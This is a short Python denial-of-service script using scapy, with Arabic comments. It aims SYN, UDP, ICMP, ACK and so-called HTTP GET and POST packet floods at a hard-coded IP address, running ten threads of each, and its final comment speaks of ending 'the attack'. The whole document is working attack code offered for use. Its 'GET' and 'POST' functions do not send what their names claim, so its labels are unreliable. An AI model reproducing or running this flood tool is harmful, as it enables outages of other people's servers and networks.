from scapy.all import *
import threading
import time

target_ip = "82.153.70.229"  # استبدل بعنوان IP للموقع المراد اختباره

# دالة لإجراء طلبات HTTP GET Flood
def http_get():
    while True:
        try:
            packet = IP(dst=target_ip) / TCP(dport=80, flags="S")  # حزمة TCP SYN
            send(packet, verbose=False)
            print(f"GET request sent to {target_ip}")
            time.sleep(1)  # الانتظار لمدة ثانية قبل الإرسال مرة أخرى
        except Exception as e:
            print(f"GET request failed: {e}")

# دالة لإجراء طلبات UDP Flood
def udp_flood():
    while True:
        try:
            packet = IP(dst=target_ip) / UDP(dport=80) / Raw(load=b"Flooding")  # حزمة UDP
            send(packet, verbose=False)
            print("UDP packet sent")
            time.sleep(1)  # الانتظار لمدة ثانية قبل الإرسال مرة أخرى
        except Exception as e:
            print(f"UDP flood failed: {e}")

# دالة لإجراء طلبات HTTP POST Flood
def http_post():
    while True:
        try:
            packet = IP(dst=target_ip) / TCP(dport=80, flags="P") / Raw(load=b"POST / HTTP/1.1\r\nHost: " + target_ip.encode() + b"\r\n\r\n")
            send(packet, verbose=False)
            print(f"POST request sent to {target_ip}")
            time.sleep(1)  # الانتظار لمدة ثانية قبل الإرسال مرة أخرى
        except Exception as e:
            print(f"POST request failed: {e}")

# دالة لإجراء هجوم SYN Flood
def syn_flood():
    while True:
        try:
            packet = IP(dst=target_ip) / TCP(dport=80, flags="S")  # حزمة SYN
            send(packet, verbose=False)
            print(f"SYN packet sent to {target_ip}")
            time.sleep(1)  # الانتظار لمدة ثانية قبل الإرسال مرة أخرى
        except Exception as e:
            print(f"SYN flood failed: {e}")

# دالة لإجراء هجوم ICMP Flood
def icmp_flood():
    while True:
        try:
            packet = IP(dst=target_ip) / ICMP()  # حزمة ICMP
            send(packet, verbose=False)
            print(f"ICMP packet sent to {target_ip}")
            time.sleep(1)  # الانتظار لمدة ثانية قبل الإرسال مرة أخرى
        except Exception as e:
            print(f"ICMP flood failed: {e}")

# دالة لإجراء هجوم ACK Flood
def ack_flood():
    while True:
        try:
            packet = IP(dst=target_ip) / TCP(dport=80, flags="A")  # حزمة ACK
            send(packet, verbose=False)
            print(f"ACK packet sent to {target_ip}")
            time.sleep(1)  # الانتظار لمدة ثانية قبل الإرسال مرة أخرى
        except Exception as e:
            print(f"ACK flood failed: {e}")

# إعدادات عدد الخيوط
num_threads = 10

# بدء الخيوط
for _ in range(num_threads):
    threading.Thread(target=http_get).start()
    threading.Thread(target=http_post).start()
    threading.Thread(target=udp_flood).start()
    threading.Thread(target=syn_flood).start()
    threading.Thread(target=icmp_flood).start()
    threading.Thread(target=ack_flood).start()

# ملاحظة: لا تنسى إيقاف البرنامج عندما ترغب في إنهاء الهجوم